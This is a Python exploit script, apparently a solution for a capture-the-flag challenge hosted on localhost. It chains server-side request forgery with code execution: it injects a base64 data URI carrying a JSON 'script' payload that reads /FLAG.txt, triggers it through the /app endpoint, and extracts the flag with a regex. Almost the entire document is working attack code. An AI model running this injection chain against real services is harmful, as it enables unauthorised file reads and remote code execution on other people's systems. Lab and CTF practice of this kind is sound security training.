import requests
import base64
import json
import re

TARGET = "http://127.0.0.1:32905"

print("[*] SSRF Data URI Injection Test")
print(f"[*] Target: {TARGET}")
print()

# Step 1: Create the malicious JSON payload
payload_dict = {"script": "open('/FLAG.txt').read()"}
payload_json = json.dumps(payload_dict)
print(f"[1] Created JSON payload: {payload_json}")
print()

# Step 2: Encode as data URI
payload_b64 = base64.b64encode(payload_json.encode()).decode()
data_uri = f"data:application/json;base64,{payload_b64}"
print(f"[2] Encoded as data URI:")
print(f"    {data_uri}")
print()

# Step 3: Test SSRF by setting data URI via /api/set
print("[3] Setting data URI via /api/set...")
set_url = f"{TARGET}/api/set"
set_data = {"url": data_uri}

try:
    set_response = requests.post(set_url, json=set_data, timeout=10)
    print(f"    POST {set_url}")
    print(f"    Status: {set_response.status_code}")
    print(f"    Response: {set_response.text}")
    print()
    
    # Step 4: Trigger RCE by accessing /app
    print("[4] Triggering RCE via /app...")
    app_url = f"{TARGET}/app"
    app_response = requests.get(app_url, timeout=10)
    print(f"    GET {app_url}")
    print(f"    Status: {app_response.status_code}")
    print(f"    Length: {len(app_response.content)}B")
    print(f"    Response: {app_response.text}")
    print()
    
    # Step 5: Extract flag from response
    print("[5] Extracting flag from response...")
    flag_pattern = r'FLAG\{[^}]+\}'
    flags = re.findall(flag_pattern, app_response.text)
    
    if flags:
        print(f"[!] FLAG FOUND: {flags[0]}")
        print()
        print(f"[+] Success! Data URI injection worked")
    else:
        print("[-] No FLAG{} pattern found in response")
        print()
        print("[*] Checking for error messages or clues...")
        if "error" in app_response.text.lower():
            print("    Error detected in response")
        if "invalid" in app_response.text.lower():
            print("    'Invalid' detected - data URI may not be supported")
        if "protocol" in app_response.text.lower():
            print("    'Protocol' detected - data URI scheme may be blocked")
            
except requests.exceptions.Timeout:
    print("[-] Request timed out")
except requests.exceptions.ConnectionError as e:
    print(f"[-] Connection error: {e}")
except Exception as e:
    print(f"[-] Error: {e}")

print()
print("[*] Testing complete")

